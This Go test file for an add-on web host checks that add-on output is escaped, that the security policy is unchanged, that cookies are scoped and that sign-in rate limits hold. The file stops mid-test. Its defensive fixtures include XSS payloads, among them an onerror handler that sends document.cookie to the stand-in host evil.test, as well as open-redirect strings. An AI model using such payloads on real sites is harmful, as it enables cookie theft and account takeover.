package httpx

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/DevOfPie/LinkCtrl/internal/addon"
	"github.com/DevOfPie/LinkCtrl/internal/auth"
	"github.com/DevOfPie/LinkCtrl/internal/config"
	"github.com/DevOfPie/LinkCtrl/internal/ratelimit"
	"github.com/DevOfPie/LinkCtrl/internal/ui"
)

// The adversarial half of M64, and it is the milestone's load-bearing claim: an
// add-on's output is data. m64.md's first risk asks for hostile output from day
// one, so these tests hand the handler exactly what a malicious module would
// answer with and read the bytes that would reach a browser.
//
// A stub rather than a wasm module, deliberately. What is under test here is the
// host's rendering decision, and a stub can answer things a compiled fixture
// would have to be rewritten to answer — including responses no SDK would
// produce. The wasm path is exercised in internal/addon, against a real module.

// stubAddonRouter stands in for the add-on host.
type stubAddonRouter struct {
	resp addon.Response
	err  error
	// seen is the last request the router was handed, so a test can assert what
	// crossed as well as what came back.
	seen addon.RequestIn
	name string
	// unknown is the names this stub does not serve. Empty — the zero value, and
	// what every test about what reaches a browser wants — serves whatever it is
	// asked for. The tests about the limiter name one here, because *a path that
	// reaches no add-on* is the case D309 is about and a stub that serves
	// everything cannot express it.
	unknown []string
}

func (s *stubAddonRouter) Route(_ context.Context, name string, in addon.RequestIn) (addon.Response, error) {
	s.name, s.seen = name, in
	return s.resp, s.err
}

func (s *stubAddonRouter) ServesRoutes(name string) bool {
	return !slices.Contains(s.unknown, name)
}

// A value receiver on the zero value, for maximalDeps: it needs something
// non-nil in the interface and never calls it.
type nopAddonRouter struct{}

func (nopAddonRouter) Route(context.Context, string, addon.RequestIn) (addon.Response, error) {
	return addon.Response{}, addon.ErrNoRoute
}

// Serving nothing, which is what Route above already answers: the two agree, and
// that agreement is the property the interface asks for.
func (nopAddonRouter) ServesRoutes(string) bool { return false }

// addonWeb is a Web wired for the add-on page and nothing else.
func addonWeb(t *testing.T, router AddonRouter) *Web {
	t.Helper()
	r, err := ui.New()
	if err != nil {
		t.Fatalf("ui.New: %v", err)
	}
	return &Web{UI: r, Addons: router}
}

// serveAddon runs one request through the handler, with the pattern's path
// values set the way ServeMux would set them.
func serveAddon(t *testing.T, web *Web, method, name, rest string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, addon.RoutePrefix+name+"/"+rest, nil)
	req.SetPathValue("addon", name)
	req.SetPathValue("rest", rest)
	rec := httptest.NewRecorder()
	web.AddonPage(rec, req)
	return rec
}

// Every shape of injection a module could try, and what the page must contain
// instead. The claim is not "the dangerous thing is stripped" — it is that the
// bytes arrive as text, which is why each case asserts the escaped form is
// present as well as asserting the raw form is absent.
func TestAnAddonsOutputIsTextAndNeverMarkup(t *testing.T) {
	cases := []struct {
		name    string
		body    string
		absent  []string
		present string
	}{
		{
			name: "script tag",
			body: `<script>alert(document.cookie)</script>`,
			// The injected tag itself, not a bare "</script>": the layout ships two
			// script elements of its own, and escaping is about the angle brackets
			// around a name rather than about the name — `alert(` as text in a
			// paragraph is inert, and `<script>alert(` is not.
			absent:  []string{"<script>alert("},
			present: "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
		},
		{
			name: "inline handler",
			body: `<img src=x onerror="fetch('//evil.test/'+document.cookie)">`,
			// `<img`, and deliberately not `onerror=`: the escaped form leaves the
			// characters o-n-e-r-r-o-r as text, which is exactly what inertness looks
			// like. What must not exist is a tag for an attribute to sit in.
			absent:  []string{"<img"},
			present: "&lt;img src=x onerror=",
		},
		{
			name: "external reference",
			body: `<script src="https://evil.test/x.js"></script>`,
			// Not a bare "<script": the layout ships three script tags of its own,
			// and a test that could not tell them from the add-on's would be
			// asserting that the dashboard has no JavaScript.
			absent:  []string{`<script src="https://evil.test`, `src="https://evil.test/x.js"`},
			present: "&lt;script src=&#34;https://evil.test/x.js&#34;&gt;",
		},
		{
			// Breaking out of the container the page puts it in, which is what an
			// escaping bug would look like from the outside.
			name:    "closing the container",
			body:    `</div></section></main><script>1</script>`,
			absent:  []string{"</main><script>"},
			present: "&lt;/div&gt;&lt;/section&gt;&lt;/main&gt;",
		},
		{
			// The classic template-injection probe. It must not be evaluated, which
			// it cannot be: the body is a value, not a template.
			name:    "template syntax",
			body:    `{{.Identity}} {{template "layout" .}}`,
			absent:  []string{"identity_menu"},
			present: `{{.Identity}} {{template &#34;layout&#34; .}}`,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
				Status: http.StatusOK, Body: tc.body,
			}})
			rec := serveAddon(t, web, http.MethodGet, "probe", "page")
			if rec.Code != http.StatusOK {
				t.Fatalf("status %d, want 200", rec.Code)
			}
			body := rec.Body.String()
			for _, forbidden := range tc.absent {
				if strings.Contains(body, forbidden) {
					t.Errorf("the page carries %q verbatim: an add-on's output reached the "+
						"document as markup, and the whole of M64's security claim is that it "+
						"cannot", forbidden)
				}
			}
			if !strings.Contains(body, tc.present) {
				t.Errorf("the page does not carry the escaped form %q; what it has is:\n%s",
					tc.present, body)
			}
			if !strings.Contains(body, "<!doctype html>") {
				t.Error("the add-on's answer did not go through the host's layout")
			}
		})
	}
}

// policyBeforeM64 is the Content-Security-Policy as it stood before this
// milestone, written out.
//
// A literal, and that is the point: comparing the header against the `csp`
// constant would agree with whatever the constant says, which is not the claim.
// m64.md's claim is that the constant did not *move*, and only a copy taken from
// before it could have moved can say so. It is allowed to differ from the
// constant exactly once — deliberately, with an argument, which is what the
// inherited `ui` rule means — and then this line is what makes that argument
// visible in a diff.
const policyBeforeM64 = "default-src 'self'; script-src 'self'; style-src 'self'; " +
	"img-src 'self' data:; font-src 'self'; connect-src 'self'; " +
	"object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'none'"

// The inherited rule, asserted where it would break: the policy is the same
// string on an add-on's page as on every other page, and the same string it was
// before add-ons could draw one.
func TestTheCSPIsUnchangedOnAnAddonPage(t *testing.T) {
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{Body: "hello"}})
	handler := SecurityHeaders(config.Config{})(http.HandlerFunc(web.AddonPage))

	req := httptest.NewRequest(http.MethodGet, addon.RoutePrefix+"probe/page", nil)
	req.SetPathValue("addon", "probe")
	req.SetPathValue("rest", "page")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if got := rec.Header().Get("Content-Security-Policy"); got != policyBeforeM64 {
		t.Errorf("the policy an add-on's page is served under is\n%q\nand before M64 it was\n%q\n"+
			"M64 renders an add-on's output as data precisely so that this string does not "+
			"have to change", got, policyBeforeM64)
	}
	if csp != policyBeforeM64 {
		t.Errorf("the csp constant is\n%q\nand M64 inherited\n%q", csp, policyBeforeM64)
	}
	if strings.Contains(csp, "unsafe") {
		t.Error("the policy carries an unsafe- directive; M64 was not allowed to add one")
	}
}

// A module that answers with a media type of its own gets it, from the closed
// vocabulary the host enforces at the moment the response is written. What
// matters here is that the bytes are not wrapped and not escaped — and that the
// type is one a browser does not execute.
func TestAnAddonMayAnswerTextOrJSON(t *testing.T) {
	for _, tc := range []struct{ contentType, body string }{
		{"text/plain; charset=utf-8", "<not markup>"},
		{"application/json", `{"ok":true}`},
	} {
		t.Run(tc.contentType, func(t *testing.T) {
			web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
				Status: http.StatusOK, ContentType: tc.contentType, Body: tc.body,
			}})
			rec := serveAddon(t, web, http.MethodGet, "probe", "api")
			if got := rec.Header().Get("Content-Type"); got != tc.contentType {
				t.Errorf("Content-Type = %q, want %q", got, tc.contentType)
			}
			if rec.Body.String() != tc.body {
				t.Errorf("body = %q, want %q", rec.Body.String(), tc.body)
			}
			if got := rec.Header().Get("Cache-Control"); got != "no-store" {
				t.Errorf("Cache-Control = %q; an add-on's answer is personal", got)
			}
		})
	}
}

// A redirect is 302 and carries no-store. The permanent forms are refused before
// they reach here — internal/addon checks the record — so what this asserts is
// that the host writes the status rather than passing one through.
func TestAnAddonsRedirectIsFound(t *testing.T) {
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
		Status: http.StatusFound, Location: "https://idp.test/authorize?x=1",
	}})
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")
	if rec.Code != http.StatusFound {
		t.Errorf("status %d, want 302 — this product never answers a permanent redirect", rec.Code)
	}
	if got := rec.Header().Get("Location"); got != "https://idp.test/authorize?x=1" {
		t.Errorf("Location = %q", got)
	}
}

// The cookie an add-on's response writes is scoped by the host: to the add-on's
// own path, with the host's own attributes. A module cannot opt out of HttpOnly,
// and cannot widen the path to the origin.
//
// What it writes is the *jar* — internal/addon packs a module's own cookies into
// it and empties the list they came from (F289) — so the name here is the host's
// and the value is opaque. The attributes are what this file has always been
// about, and they did not change.
func TestTheHostScopesTheJarItWritesForAnAddon(t *testing.T) {
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
		Body: "ok",
		Jar:  []addon.JarCookie{{Name: "linkctrl_addon_probe_kept", Value: "packed", MaxAge: 300}},
	}})
	web.Config.SecureCookies = true
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")

	set := rec.Header().Get("Set-Cookie")
	for _, want := range []string{
		"linkctrl_addon_probe_kept=packed", "Path=/addons/probe/", "HttpOnly", "Secure",
		"SameSite=Lax", "Max-Age=300",
	} {
		if !strings.Contains(set, want) {
			t.Errorf("Set-Cookie %q is missing %q", set, want)
		}
	}
}

// The structural half of F289, asserted where the header is written rather than
// where the jar is packed.
//
// A response arrives here carrying twelve hundred cookies a module named — the
// flood that evicted `linkctrl_session` in Chromium at n=180 — and *nothing* is
// written, because this writer has no path to a module's own list at all. That
// is the property the fix rests on: not that some bound was applied upstream,
// but that a caller here cannot write an add-on's cookies even by trying, so a
// later milestone adding a second writer cannot reintroduce the flood by
// forgetting a check it never had to know about.
func TestTheWriterCannotWriteACookieAModuleNamed(t *testing.T) {
	flood := make([]addon.Cookie, 1200)
	for i := range flood {
		flood[i] = addon.Cookie{Name: "probe_flood_" + strconv.Itoa(i), Value: "x", MaxAge: 31536000}
	}
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{Body: "ok", SetCookie: flood}})
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")

	if got := rec.Header()["Set-Cookie"]; len(got) != 0 {
		t.Errorf("%d Set-Cookie headers reached the browser from a module's own list; "+
			"the first is %q", len(got), got[0])
	}
	if rec.Code != http.StatusOK {
		t.Errorf("status %d: the page itself still answers", rec.Code)
	}
}

// The page is reachable with no session at all, which is D261 and is what makes
// M65's hook implementable on this surface. The record says so honestly rather
// than by omission: `signed_in` is false.
func TestAnAddonPageIsReachableWithoutASession(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{Body: "sign in"}}
	web := addonWeb(t, stub)
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d: an anonymous visitor could not reach an add-on's page, so no "+
			"add-on can begin a sign-in", rec.Code)
	}
	// **What crosses this seam since M65 is the identity, not a record built from
	// it**: internal/addon derives the SessionContext a module sees, because the
	// record's own claim — that nothing in it is a credential — is a property of
	// that mapping and belongs beside the record. What this test still owns is the
	// half that is this package's: an anonymous request hands over nobody.
	if stub.seen.Identity != nil {
		t.Errorf("an anonymous request carried an identity: %+v", stub.seen.Identity)
	}
}

// And with one, the identity crosses — and nothing else does. The absences are
// the assertion: no cookie, no token, no session identifier, which is what the
// SessionContext record promises at the ABI's surface.
func TestASignedInVisitorsIdentityCrossesAndNothingElseDoes(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{Body: "hello"}}
	web := addonWeb(t, stub)

	id := &auth.Identity{
		UserID:      mustUUID("0198c9c5-0000-7000-8000-000000000001"),
		Email:       "owner@example.com",
		Name:        "Owner",
		WorkspaceID: mustUUID("0198c9c5-0000-7000-8000-000000000002"),
		OrgID:       mustUUID("0198c9c5-0000-7000-8000-000000000003"),
		SessionID:   mustUUID("0198c9c5-0000-7000-8000-0000000000ff"),
		Role:        "owner",
	}
	req := httptest.NewRequest(http.MethodGet, addon.RoutePrefix+"probe/page", nil)
	req.SetPathValue("addon", "probe")
	req.SetPathValue("rest", "page")
	req.AddCookie(&http.Cookie{Name: auth.CookieName(false), Value: "a-real-looking-token"})
	req = req.WithContext(context.WithValue(req.Context(), ctxIdentity, id))
	rec := httptest.NewRecorder()
	web.AddonPage(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status %d", rec.Code)
	}
	if stub.seen.Identity != id {
		t.Errorf("the request did not carry the identity the host resolved: %+v", stub.seen.Identity)
	}
	// The cookie the browser sent is the credential (D232), and it must not reach
	// the host's input either — the filtering to declared prefixes happens inside
	// internal/addon, but this package is what decides which cookies it is handed,
	// and that decision is "all of them, deliberately". What makes that safe is
	// asserted where the filter is; what is asserted here is that this package
	// hands over the identity and never a session of its own devising.
	//
	// The record a module actually sees, and the absence of a credential in it, is
	// TestASignedInIdentityCrossesAsARecordAndNothingElseDoes in internal/addon,
	// where the mapping lives.
	if stub.seen.Identity.SessionID != id.SessionID {
		t.Error("the identity was rebuilt rather than passed through")
	}
}

// The three failures a routing call can produce, each mapped to the status an
// operator and a visitor can act on.
func TestARoutingFailureAnswersWhatItMeans(t *testing.T) {
	for _, tc := range []struct {
		err  error
		want int
	}{
		{addon.ErrNoRoute, http.StatusNotFound},
		{addon.ErrBusy, http.StatusServiceUnavailable},
		// The one failure the *client* caused, so the one that is not a 5xx: the
		// record built from the body somebody sent does not fit one ABI value.
		{addon.ErrRequestTooLarge, http.StatusRequestEntityTooLarge},
		{addon.ErrNoHandler, http.StatusBadGateway},
		{addon.ErrNoResponse, http.StatusBadGateway},
		{addon.ErrGuestFailed, http.StatusBadGateway},
	} {
		t.Run(tc.err.Error(), func(t *testing.T) {
			web := addonWeb(t, &stubAddonRouter{err: tc.err})
			rec := serveAddon(t, web, http.MethodGet, "probe", "page")
			if rec.Code != tc.want {
				t.Errorf("%v answered %d, want %d", tc.err, rec.Code, tc.want)
			}
			// Nothing the guest said reaches the reader.
			if strings.Contains(rec.Body.String(), tc.err.Error()) {
				t.Error("the failure's own text reached the page")
			}
		})
	}
}

// The prefix is on the application tree and nowhere else, which is the redirect
// tree's minimality rule applied to this milestone. Read off the registration
// pass rather than off a list: the mount is what the root tree would route.
func TestTheAddonPrefixIsOnTheApplicationTreeOnly(t *testing.T) {
	app := newAppMux()
	registerAppRoutes(maximalDeps(), app)

	var mounted bool
	for _, m := range app.mounts() {
		if m == addon.RoutePrefix {
			mounted = true
		}
	}
	if !mounted {
		t.Fatalf("%q is not among the application mounts: %v", addon.RoutePrefix, app.mounts())
	}
	if !isReserved("addons") {
		t.Error("the addons prefix is not in internal/alias/reserved.txt, so a user could " +
			"create an alias that shadows every add-on's pages")
	}

	// The link tree is built from registerRedirect and the ops endpoints, neither
	// of which can carry an application pattern — so the falsifiable form is that
	// an add-on route is not among the patterns a *link* host serves. NewRouter
	// with SplitHosts is what proves it end to end, and that is
	// TestAnAddonRouteIsNotOnTheLinkHost below.
}

// The other half of m64.md's first bullet, and the half the test above could
// only assert about a list: an add-on route registered on the link host 404s.
//
// Driven through NewRouter with SplitHosts, because that is the only place the
// two trees exist as separate muxes, and driven as a real request carrying a Host
// header, because that is what a reverse proxy in front of one listener sends. A
// pattern list would not do: the claim is about which tree answers, and both
// trees are assembled inside NewRouter from registrations neither list can see.
func TestAnAddonRouteIsNotOnTheLinkHost(t *testing.T) {
	const (
		appHost  = "manage.addons.test"
		linkHost = "go.addons.test"
	)
	// A real Config through Parse, for the reason the split-host integration
	// fixture uses one: the split is decided by unexported parsed origins, so a
	// hand-built struct cannot turn it on and a test cannot half-enable it.
	for k, v := range map[string]string{
		"LINKCTRL_APP_ENV":        "development",
		"LINKCTRL_BASE_URL":       "http://" + appHost,
		"LINKCTRL_APP_BASE_URL":   "http://" + appHost,
		"LINKCTRL_LINK_BASE_URL":  "http://" + linkHost,
		"LINKCTRL_API_KEY_PEPPER": strings.Repeat("p", 48),
		"LINKCTRL_DATABASE_URL":   "postgres://u:p@127.0.0.1:5432/linkctrl?sslmode=disable",
		"LINKCTRL_SECURE_COOKIES": "false",
	} {
		t.Setenv(k, v)
	}
	cfg, err := config.Parse()
	if err != nil {
		t.Fatalf("parse a split-host configuration: %v", err)
	}
	if !cfg.SplitHosts() {
		t.Fatal("the configuration did not register as split-host, so the rest of this " +
			"test would be asserting about one mux twice")
	}

	stub := &stubAddonRouter{resp: addon.Response{Body: "the module answered"}}
	web := addonWeb(t, stub)
	web.Config = cfg
	handler := NewRouter(Deps{
		Config: cfg,
		Web:    web,
		// A route of the link tree's own, so that a 404 below is a route this
		// milestone did not put there rather than a tree nothing was put in.
		Health: &Health{},
	})
	path := addon.RoutePrefix + "probe/json"

	// The dashboard host: the pattern is live and the module is what answers.
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://"+appHost+path, nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("the dashboard host answered %d for %q, so this test cannot tell an "+
			"absent route from a broken one", rec.Code, path)
	}
	if stub.name != "probe" {
		t.Fatalf("the dashboard host did not route to an add-on: the host was asked for %q", stub.name)
	}

	// The link host: the same path, and nothing of this milestone's is there.
	stub.name = ""
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://"+linkHost+path, nil))
	if rec.Code != http.StatusNotFound {
		t.Errorf("the link host answered %d for %q, want 404: an add-on route on the "+
			"redirect tree is a session lookup and a template render on the path whose "+
			"whole rule is that it has neither", rec.Code, path)
	}
	if stub.name != "" {
		t.Errorf("the link host routed a request into add-on %q", stub.name)
	}
	if strings.Contains(rec.Body.String(), "the module answered") {
		t.Error("the link host served an add-on's body")
	}

	// And the link tree was built, so the 404 above is an absence rather than an
	// empty mux agreeing with whatever it is asked.
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://"+linkHost+"/healthz", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("the link host answered %d for /healthz, so it 404s everything and the "+
			"assertion above proves nothing", rec.Code)
	}
}

// With no add-on host, no route exists at all — m60.md's "no route is mounted",
// still true for every operator who installs nothing.
//
// **Three fields since M68**, and the one that would hurt most is still M67's:
// the lifecycle API is an upload endpoint, and mounting it on an instance whose
// operator never turned add-ons on would be a body-reading route paid for by
// everybody who installs nothing. All three are nil'd here because all three come
// from the same host, and the assertion is over the whole registered set rather
// than over any field's own routes.
//
// **What it matches widened with them.** `addon.RoutePrefix` is `/addons/`, and
// M68's manager sits at `/instance/addons` — which does not contain it, so a
// sweep for the prefix alone would have said nothing about five new routes. It
// looks for both, and the second string is [AddonManagerPath] rather than a
// literal, so a manager that moves cannot move out of this test's sight.
func TestNoAddonRouteWithoutAHost(t *testing.T) {
	d := maximalDeps()
	d.Web.Addons = nil
	d.Web.AddonAdmin = nil
	d.AddonAdmin = nil
	app := newAppMux()
	registerAppRoutes(d, app)
	for _, p := range app.patterns {
		if strings.Contains(p, addon.RoutePrefix) || strings.Contains(p, AddonManagerPath) {
			t.Errorf("an instance with no add-on host registered %q", p)
		}
	}
}

// mustUUID is a literal identifier, parsed. A test that built one by hand would
// be asserting about a value no session ever carries.
func mustUUID(s string) uuid.UUID { return uuid.MustParse(s) }

// --- M65: what a mint does to the response ----------------------------------

// The host writes the cookie and the module's own answer is still served, which
// is what lets an add-on send somebody on to wherever its flow was going while
// the browser picks up a session on the way.
func TestAMintedSessionBecomesTheHostsOwnCookie(t *testing.T) {
	expires := time.Now().Add(time.Hour)
	stub := &stubAddonRouter{resp: addon.Response{
		Location: "/dashboard",
		Minted: &addon.Minted{
			Token: config.Secret("a-real-session-token"), ExpiresAt: expires,
		},
	}}
	web := addonWeb(t, stub)
	rec := serveAddon(t, web, http.MethodGet, "oidc", "callback")

	if rec.Code != http.StatusFound {
		t.Fatalf("status %d: the module's own redirect was not served", rec.Code)
	}
	if got := rec.Header().Get("Location"); got != "/dashboard" {
		t.Errorf("Location is %q; the module still decides where the visitor goes", got)
	}
	var session *http.Cookie
	for _, c := range rec.Result().Cookies() {
		if c.Name == auth.CookieName(false) {
			session = c
		}
	}
	if session == nil {
		t.Fatalf("no session cookie was written: %v", rec.Header()["Set-Cookie"])
	}
	if session.Value != "a-real-session-token" {
		t.Errorf("the cookie carries %q", session.Value)
	}
	// The host's attributes, not the module's — the same ones the sign-in form
	// writes, because it is the same constructor.
	if !session.HttpOnly || session.Path != "/" || session.SameSite != http.SameSiteLaxMode {
		t.Errorf("the session cookie was not written with this product's own attributes: %+v", session)
	}
}

// A second factor still owed takes the request over. The module's `location`
// becomes where the visitor lands *after* the prompt, and the pending credential
// travels in the redirect the way the sign-in form's does.
func TestASecondFactorOwedSendsTheVisitorToTheHostsOwnPrompt(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{
		Location: "/addons/oidc/done",
		Body:     "the module's own page",
		Minted: &addon.Minted{
			PendingToken: config.Secret("a-pending-token"), SecondFactorRequired: true,
		},
	}}
	web := addonWeb(t, stub)
	rec := serveAddon(t, web, http.MethodGet, "oidc", "callback")

	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status %d, want 303", rec.Code)
	}
	got := rec.Header().Get("Location")
	if !strings.HasPrefix(got, "/login/code?t=a-pending-token") {
		t.Errorf("the visitor was not sent to the second-factor prompt: %q", got)
	}
	if !strings.Contains(got, "next=%2Faddons%2Foidc%2Fdone") {
		t.Errorf("the module's own destination was not carried past the prompt: %q", got)
	}
	// No session cookie, because there is no session: the account still owes a
	// factor and the type makes that a different value rather than a flag.
	for _, c := range rec.Result().Cookies() {
		if c.Name == auth.CookieName(false) {
			t.Error("a session cookie was written for somebody who still owes a second factor")
		}
	}
	if strings.Contains(rec.Body.String(), "the module's own page") {
		t.Error("the module's answer was served as well as the prompt")
	}
}

// An add-on's `location` may legitimately be an external URL — an authorization
// endpoint is one — and an external URL is not something the sign-in flow may be
// pointed at. safeNext is what stops the second-factor prompt becoming an open
// redirect on somebody's way into their account.
func TestAnAddonsExternalDestinationCannotBecomeTheSignInsNext(t *testing.T) {
	for _, location := range []string{
		"https://evil.test/steal", "//evil.test/steal", "/\\evil.test",
	} {
		t.Run(location, func(t *testing.T) {
			stub := &stubAddonRouter{resp: addon.Response{
				Location: location,
				Minted: &addon.Minted{
					PendingToken: config.Secret("a-pending-token"), SecondFactorRequired: true,
				},
			}}
			rec := serveAddon(t, addonWeb(t, stub), http.MethodGet, "oidc", "callback")
			got := rec.Header().Get("Location")
			if !strings.Contains(got, "next=%2Fdashboard") {
				t.Errorf("%q survived into the prompt's next: %q", location, got)
			}
			if strings.Contains(got, "evil.test") {
				t.Errorf("an external destination reached the sign-in flow: %q", got)
			}
		})
	}
}

// A response with nothing minted is untouched, which is every add-on that is not
// an authentication add-on and every request that did not sign anybody in.
func TestAResponseThatMintedNothingIsUnchanged(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{Body: "just a page"}}
	rec := serveAddon(t, addonWeb(t, stub), http.MethodGet, "oidc", "page")
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d", rec.Code)
	}
	if len(rec.Result().Cookies()) != 0 {
		t.Errorf("a cookie was written for a request that minted nothing: %v", rec.Result().Cookies())
	}
}

// --- M65, D305: the prefix is a credential endpoint, all of it ---------------

// Every add-on route is charged against the login budget, whatever the add-on
// behind it may or may not do.
//
// The stub here holds no grant and mints nothing — it is the *cheapest* add-on
// an instance can run, a page and no credential — and it is charged anyway. That
// is the whole of D305: a worker had built the narrower rule, charging only an
// add-on holding `session.mint`, and the owner overruled it because protection
// keyed on a grant in a manifest is protection the next grant can move out of
// reach. So this test asserts the cost as much as the protection: an add-on that
// carries none of the risk pays, deliberately.
//
// Driven through registerAppRoutes and RealIP rather than by calling the
// middleware, because what is under test is the *wiring* — the guard being on
// both patterns — and a test that called the limiter directly would keep passing
// with the routes registered bare.
func TestEveryAddonRouteIsChargedAgainstTheLoginBudget(t *testing.T) {
	for _, tc := range []struct{ name, path string }{
		{"the page pattern", addon.RoutePrefix + "notes/page"},
		{"the bare pattern", addon.RoutePrefix + "notes"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			d := maximalDeps()
			d.Web = addonWeb(t, &stubAddonRouter{resp: addon.Response{Body: "a page, and no credential in it"}})
			// Two, so the third request is the refusal and the first two prove the
			// route works at all.
			d.Limits.Login = ratelimit.New(2, ratelimit.Options{})
			d.Metrics = nil
			app := newAppMux()
			registerAppRoutes(d, app)
			h := RealIP(nil)(app.mux)

			ask := func() *httptest.ResponseRecorder {
				req := httptest.NewRequest(http.MethodGet, tc.path, nil)
				req.RemoteAddr = "203.0.113.7:5555"
				rec := httptest.NewRecorder()
				h.ServeHTTP(rec, req)
				return rec
			}
			for i := range 2 {
				if got := ask().Code; got != http.StatusOK {
					t.Fatalf("request %d answered %d, want 200: the route is broken and "+
						"the refusal below would prove nothing", i+1, got)
				}
			}
			rec := ask()
			if rec.Code != http.StatusTooManyRequests {
				t.Fatalf("the third request answered %d, want 429: %q is unlimited, and "+
					"an anonymous caller can repeat whatever an add-on on it does",
					rec.Code, tc.path)
			}
			if rec.Header().Get("Retry-After") == "" {
				t.Error("the refusal carries no Retry-After, so a client cannot tell how " +
					"long to wait and this reads as an outage rather than a limit")
			}
		})
	}
}

// The login limit is one budget across every surface that spends it, so an
// add-on route cannot be used to top up an attacker's allowance for the sign-in
// form — or the other way round.
func TestTheAddonPrefixSharesTheLoginBudgetWithSignIn(t *testing.T) {
	d := maximalDeps()
	d.Web = addonWeb(t, &stubAddonRouter{resp: addon.Response{Body: "a page"}})
	d.Limits.Login = ratelimit.New(1, ratelimit.Options{})
	d.Metrics = nil
	app := newAppMux()
	registerAppRoutes(d, app)
	h := RealIP(nil)(app.mux)

	ask := func(method, path string) int {
		req := httptest.NewRequest(method, path, nil)
		req.RemoteAddr = "203.0.113.8:5555"
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec.Code
	}
	if got := ask(http.MethodGet, addon.RoutePrefix+"notes/page"); got != http.StatusOK {
		t.Fatalf("the add-on route answered %d, want 200", got)
	}
	// The sign-in submission, not the form: the form is a page and carries no
	// limit. 429 here is the limiter refusing before the handler is reached,
	// which is also why this asserts nothing about what LoginSubmit would do.
	if got := ask(http.MethodPost, "/login"); got != http.StatusTooManyRequests {
		t.Errorf("after one add-on request the sign-in submission answered %d, want 429: "+
			"the two surfaces are on separate budgets, so an attacker has twice the "+
			"allowance an operator set", got)
	}
}

// --- M65, D309: a path that reaches no add-on is not an add-on route ---------

// The reproduction, verbatim.
//
// D305 charges every add-on route against the login budget. It was implemented
// as the whole `/addons/` prefix, so a 404 was charged too — and `addon.Open`
// returns a host whenever `LINKCTRL_ADDONS_DIR` is set, so an instance with the
// directory configured and **no add-ons in it** registered both patterns and paid
// on every probe. An ordinary scanner walking two well-known paths therefore
// denied somebody their sign-in, and with `TRUSTED_PROXIES` unset denied it to
// every visitor at once, because then every request carries the proxy's address.
//
// The two paths are the ones a scanner actually asks for. Nothing about the test
// needs them to be those, and they are those because the report was measured with
// them and a reader should be able to see the same thing.
func TestAProbeUnderTheAddonPrefixDoesNotSpendTheSignInBudget(t *testing.T) {
	stub := &stubAddonRouter{
		resp:    addon.Response{Body: "unreachable"},
		unknown: []string{"nosuch"},
	}
	d := maximalDeps()
	d.Web = addonWeb(t, stub)
	// The number the report used, and the point of it being small: two probes are
	// the whole budget, so a third request refused would be visible immediately.
	d.Limits.Login = ratelimit.New(2, ratelimit.Options{})
	d.Metrics = nil
	app := newAppMux()
	registerAppRoutes(d, app)
	h := RealIP(nil)(app.mux)

	ask := func(method, path string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(method, path, nil)
		req.RemoteAddr = "203.0.113.9:5555"
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec
	}
	for _, path := range []string{
		addon.RoutePrefix + "nosuch/wp-login.php",
		addon.RoutePrefix + "nosuch/xmlrpc.php",
	} {
		if got := ask(http.MethodGet, path).Code; got != http.StatusNotFound {
			t.Fatalf("%s answered %d, want 404", path, got)
		}
	}
	if stub.name != "" {
		t.Errorf("the router was handed a request for %q: a name no add-on serves must "+
			"not reach the host at all", stub.name)
	}
	// The budget itself, read off the limiter the sign-in form shares. Two allows
	// have to remain, which is the whole of a `Login = 2` instance's allowance —
	// so the probes above spent none of it. Asked here rather than by posting the
	// sign-in form, because a 429 there is answered by the middleware while
	// anything else runs LoginSubmit against services this test has not built;
	// that the two surfaces are one budget is
	// [TestTheAddonPrefixSharesTheLoginBudgetWithSignIn]'s claim, already made.
	for i := range 2 {
		if ok, _ := d.Limits.Login.Allow(netip.MustParseAddr("203.0.113.9")); !ok {
			t.Fatalf("allowance %d of 2 was already spent after two 404s under /addons/. "+
				"A request that reached no add-on is not an add-on route, and charging it "+
				"makes an ordinary scanner a denial of sign-in for that address — or, with "+
				"TRUSTED_PROXIES unset, for everybody", i+1)
		}
	}
	if ok, _ := d.Limits.Login.Allow(netip.MustParseAddr("203.0.113.9")); ok {
		t.Error("a third allowance was granted on a limiter set to two, so the two checks " +
			"above proved nothing about what the probes spent")
	}
}

// The bare pattern is the same claim, and it is asked separately because it is a
// second registration: `/addons/nosuch` matches AddonBarePattern and
// `/addons/nosuch/anything` matches AddonPagePattern, so a guard fixed on one and
// not the other would leave half the prefix charging misses.
func TestTheBarePatternDoesNotChargeAMissEither(t *testing.T) {
	stub := &stubAddonRouter{unknown: []string{"nosuch"}}
	d := maximalDeps()
	d.Web = addonWeb(t, stub)
	d.Limits.Login = ratelimit.New(1, ratelimit.Options{})
